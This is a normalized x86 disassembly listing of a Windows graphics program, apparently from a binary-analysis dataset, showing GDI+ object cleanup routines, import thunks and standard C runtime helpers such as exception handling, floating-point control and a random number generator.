call GdiplusShutdown
retn
sub_40182a
push esi
mov esi ecx
push [ esi + 0x4 ]
mov [ esi ] r--data
call GdipDisposeImage
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call GdipFree
sub_4018a0
push esi
mov esi ecx
push [ esi + 0x4 ]
mov [ esi ] r--data
call GdipDeleteBrush
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call GdipFree
sub_4018fb
push esi
mov esi ecx
call sub_401916
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call GdipFree
sub_401916
push [ ecx + 0x4 ]
mov [ ecx ] r--data
call GdipDeleteBrush
retn
sub_401925
push [ ecx ]
call GdipDeletePen
retn
sub_401993
push [ ecx ]
call GdipDeleteGraphics
retn
sub_401aa2
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
jmp r-xdata
retn 0x4
sub_401b1a
push [ ecx ]
call GdipDeleteFont
retn
sub_401b59
push [ esp + 0x4 ]
call GdipFree
retn
sub_401c1e
push esi
mov esi ecx
call sub_401c39
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call GdipFree
sub_401c39
push [ ecx + 0x4 ]
mov [ ecx ] r--data
call GdipDisposeImage
retn
sub_401c48
jmp r-xdata
mov eax 0xbb8
cdq
idiv [ rw-data ]
mov [ rw-data ] eax
retn
sub_401c5f
call sub_401c69
jmp sub_401c73
sub_401c69
mov ecx rw-data
jmp sub_402324
sub_401c73
push sub_401c7f
call sub_40437f
pop ecx
retn
sub_401c7f
mov ecx rw-data
jmp sub_402352
sub_401c89
call sub_401c93
jmp sub_401c9d
sub_401c93
mov ecx rw-data
jmp sub_401000
sub_401c9d
push sub_401ca9
call sub_40437f
pop ecx
retn
sub_401ca9
mov ecx rw-data
jmp sub_40111f
sub_401cb3
call sub_401cbd
jmp sub_401cc7
sub_401cbd
mov ecx rw-data
jmp sub_4030f2
sub_401cc7
push sub_401cd3
call sub_40437f
pop ecx
retn
sub_401cd3
mov ecx rw-data
jmp sub_403146
sub_402324
fld [ r--data ]
mov eax ecx
fstp [ eax + 0x48 ]
mov [ eax ] r--data
retn
sub_402336
push esi
mov esi ecx
call sub_402352
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40427b
pop ecx
sub_402352
mov [ ecx ] r--data
retn
sub_40312a
push esi
mov esi ecx
call sub_403146
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40427b
pop ecx
sub_403146
mov [ ecx ] r--data
retn
sub_40374b
add ecx 0xc
push 0x3e8
push ecx
push [ esp + 0xc ]
call sub_404860
add esp 0xc
retn 0x4
sub_40383b
push esi
mov esi ecx
push 0x3e8
push 0x0
lea eax [ esi + 0xc ]
push eax
call sub_4043c0
add esp 0xc
mov ecx esi
call sub_403260
pop esi
retn
sub_403959
call sub_403963
jmp sub_40396d
sub_403963
mov ecx rw-data
jmp sub_403983
sub_40396d
push sub_403979
call sub_40437f
pop ecx
retn
sub_403979
mov ecx rw-data
jmp sub_4039cd
sub_403983
push esi
mov esi ecx
push 0x104
lea eax [ esi + 0x104 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
mov eax esi
pop esi
retn
sub_4039cd
retn
sub_403b68
mov eax ecx
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x1
mov [ eax + 0x110 ] 0x1
retn
sub_403ca2
mov eax ecx
and [ eax + 0x31c ] 0x0
mov [ eax ] 0x1
mov [ eax + 0x10c ] 0x1
retn
GdipDeleteBrush
jmp [ GdipDeleteBrush@IAT ]
GdipDeletePen
jmp [ GdipDeletePen@IAT ]
GdipCreatePen1
jmp [ GdipCreatePen1@IAT ]
GdiplusStartup
jmp [ GdiplusStartup@IAT ]
GdiplusShutdown
jmp [ GdiplusShutdown@IAT ]
GdipGraphicsClear
jmp [ GdipGraphicsClear@IAT ]
GdipDisposeImage
jmp [ GdipDisposeImage@IAT ]
GdipDeleteGraphics
jmp [ GdipDeleteGraphics@IAT ]
GdipDrawRectangleI
jmp [ GdipDrawRectangleI@IAT ]
GdipDrawImageRectI
jmp [ GdipDrawImageRectI@IAT ]
GdipGetImageGraphicsContext
jmp [ GdipGetImageGraphicsContext@IAT ]
GdipCreateBitmapFromScan0
jmp [ GdipCreateBitmapFromScan0@IAT ]
GdipDrawImageRect
jmp [ GdipDrawImageRect@IAT ]
GdipDeleteFont
jmp [ GdipDeleteFont@IAT ]
GdipFree
jmp [ GdipFree@IAT ]
GdipAlloc
jmp [ GdipAlloc@IAT ]
GdipCloneBrush
jmp [ GdipCloneBrush@IAT ]
GdipCreateSolidFill
jmp [ GdipCreateSolidFill@IAT ]
GdipClonePen
jmp [ GdipClonePen@IAT ]
GdipCreateFromHDC
jmp [ GdipCreateFromHDC@IAT ]
GdipDrawString
jmp [ GdipDrawString@IAT ]
GdipDeleteFontFamily
jmp [ GdipDeleteFontFamily@IAT ]
GdipCreateFont
jmp [ GdipCreateFont@IAT ]
GdipCreateFontFamilyFromName
jmp [ GdipCreateFontFamilyFromName@IAT ]
GdipLoadImageFromFile
jmp [ GdipLoadImageFromFile@IAT ]
GdipLoadImageFromFileICM
jmp [ GdipLoadImageFromFileICM@IAT ]
GdipCloneImage
jmp [ GdipCloneImage@IAT ]
GdipGetImageWidth
jmp [ GdipGetImageWidth@IAT ]
GdipGetImageHeight
jmp [ GdipGetImageHeight@IAT ]
gluPerspective
jmp [ gluPerspective@IAT ]
sub_403e6c
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_403e73
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_404099
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40411c
call sub_404133
call sub_405778
mov [ rw-data ] eax
call sub_405728
fnclex
retn
sub_404133
mov eax sub_405b66
mov [ rw-data ] sub_4057fb
mov [ rw-data ] eax
mov [ rw-data ] sub_405861
mov [ rw-data ] sub_4057a1
mov [ rw-data ] sub_405849
mov [ rw-data ] eax
retn
sub_40418c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_404216
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40418c
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_404242
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_40425c
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_40427b
push [ esp + 0x4 ]
call sub_405bdc
pop ecx
retn
sub_40437f
push [ esp + 0x4 ]
call sub_404312
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_404418
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_404422
mov eax [ rw-data ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ rw-data ] eax
sar eax 0x10
and eax 0x7fff
retn
sub_404440
sub esp 0x8
fst [ esp ]
call sub_406ae8
call sub_40445d
add esp 0x8
retn
sub_404454
lea edx [ esp + 0x4 ]
call sub_406aa5
sub_4045a4
mov eax [ esp + 0x4 ]
test eax eax
jge r-xdata
retn
neg eax
sub_4046ed
call sub_40866e
test eax eax
jne r-xdata
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4084fe
add esp 0x10
retn
retn
sub_40470d
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4046ed
add esp 0xc
retn
sub_404772
push 0x1
push [ esp + 0x8 ]
call sub_404504
pop ecx
pop ecx
retn
sub_404b95
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_404c7d
push rw-data
push rw-data
call sub_404c7d
add esp 0x10
retn
call eax
sub_404bc2
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_404be4
add esp 0xc
retn
sub_404bd3
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_404be4
add esp 0xc
retn
sub_404e0a
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_409c0d
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_409bd4
sub_4051dc
push [ ebp - 0x14 ]
call sub_405213
pop ecx
retn
sub_405213
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_40567c
xor eax eax
retn
sub_405340
push [ ebp - 0x14 ]
call sub_4053b0
pop ecx
retn
sub_405592
push 0x1
pop eax
retn
sub_405596
mov esp [ ebp - 0x18 ]
jmp sub_40567c
sub_4055f4
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_4055fd
mov esp [ ebp - 0x18 ]
jmp sub_40567c
sub_4056b9
push 0x1
pop eax
retn
sub_40570f
push 0x1
pop eax
retn
sub_405728
push 0x30000
push 0x10000
call sub_40a231
pop ecx
pop ecx
retn
sub_405849
mov eax [ esp + 0x4 ]
fld [ eax ]
fcomp [ r--data ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
retn
push 0x1
pop eax
retn
sub_405b1c
push [ esp + 0x10 ]
mov [ rw-data ] 0x1
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40589f
and [ rw-data ] 0x0
add esp 0x10
retn
sub_405b43
push [ esp + 0xc ]
mov [ rw-data ] 0x1
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4059a3
and [ rw-data ] 0x0
add esp 0xc
retn
sub_4064ef
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_40ae55
pop ecx
cmp ax 0xffff
mov eax [ esp + 0x10 ]
pop ecx
jne r-xdata
inc [ eax ]
retn
or [ eax ] 0xffffffff
retn
sub_406a49
mov [ ebp - 0x90 ] 0x1
or cl cl
retn
sub_406a53
or cl cl
je r-xdata
retn
fchs
sub_406a60
fld st0
frndint
fsubr st1
fxch st1
fchs
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_406a75
mov edx [ esp + 0x4 ]
and edx 0x300
or edx 0x7f
mov [ esp + 0x6 ] dx
fldcw [ esp + 0x6 ]
retn
sub_406a8c
test eax 0x80000
je r-xdata
fadd [ r--data ]
mov eax 0x1
retn
mov eax 0x7
retn
sub_406ae8
mov eax [ esp + 0x8 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ esp + 0x8 ]
retn
retn
sub_4081b9
push 0x1
call sub_4081c2
pop ecx
retn
sub_408f22
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_408f32
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_409171
call sub_4081b9
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_40bfb1
sub_409bb9
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_4041ae
add esp 0x8
pop ebp
retn 0x4
sub_409da6
push sub_409d60
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_409db7
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_409dc4
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_409de0
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_409dfc
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40a231
mov eax [ esp + 0x8 ]
and eax 0xfff7ffff
push eax
push [ esp + 0x8 ]
call sub_40a1fc
pop ecx
pop ecx
retn
sub_40a808
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40a69c
add esp 0xc
retn
sub_40a81e
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40a69c
add esp 0xc
retn
sub_40ab9b
push 0x2
call sub_404de5
pop ecx
retn
sub_40ac82
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 8 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_40b01a
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40b031
add esp 0x10
retn
sub_40b9a1
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40b9b6
inc [ rw-data ]
sub_40c009
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_40c01a
add esp 0xc
retn
sub_40c40f
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_40c04b
pop ecx
mov [ rw-data ] 0x1
sub_40c829
push 0x1
pop eax
retn
sub_40c989
push 0x1
pop eax
retn
sub_40ca3d
push 0x1
pop eax
retn
sub_40d9bb
mov eax [ esp + 0x4 ]
cmp eax 0x1
je r-xdata
mov [ rw-data ] 0x21
jle r-xdata
retn
cmp eax 0x3
jg r-xdata
mov [ rw-data ] 0x22
retn
sub_40d9e1
xor eax eax
retn
sub_40d9e4
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x2 ]
movsx eax [ ebp - 0x2 ]
leave
retn
sub_40d9f2
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x2 ]
fnclex
movsx eax [ ebp - 0x2 ]
leave
retn
sub_40e428
push 0x1
pop eax
retn
sub_40e497
push 0x1
pop eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40e7d8
lea ecx [ ebp - 0x20 ]
jmp sub_401916
sub_40e7e0
lea ecx [ ebp - 0x14 ]
jmp sub_401925
sub_40e7e8
mov eax r--data
jmp sub_403ec9
sub_40e7f4
lea ecx [ ebp - 0x3c ]
jmp sub_401c39
sub_40e7fc
lea ecx [ ebp - 0x24 ]
jmp sub_401993
sub_40e804
lea ecx [ ebp - 0x2c ]
jmp sub_401925
sub_40e80c
mov eax r--data
jmp sub_403ec9
sub_40e818
lea ecx [ ebp - 0x40 ]
jmp sub_401c39
sub_40e820
lea ecx [ ebp - 0x30 ]
jmp sub_401993
sub_40e828
mov eax r--data
jmp sub_403ec9
sub_40e834
lea ecx [ ebp - 0x34 ]
jmp sub_401c39
sub_40e83c
lea ecx [ ebp - 0x1c ]
jmp sub_401993
sub_40e844
lea ecx [ ebp - 0x58 ]
jmp sub_401b1a
sub_40e84c
lea ecx [ ebp - 0x44 ]
jmp sub_401b1a
sub_40e854
lea ecx [ ebp - 0x50 ]
jmp sub_401916
sub_40e85c
mov eax r--data
jmp sub_403ec9
sub_40e868
push [ ebp - 0x10 ]
call sub_401b59
pop ecx
retn
sub_40e872
mov eax r--data
jmp sub_403ec9
sub_40e87c
push [ ebp - 0x14 ]
call sub_40427b
pop ecx
retn
sub_40e886
mov eax r--data
jmp sub_403ec9
sub_40e890
push [ ebp - 0x14 ]
call sub_40427b
pop ecx
retn
sub_40e89a
mov eax r--data
jmp sub_403ec9
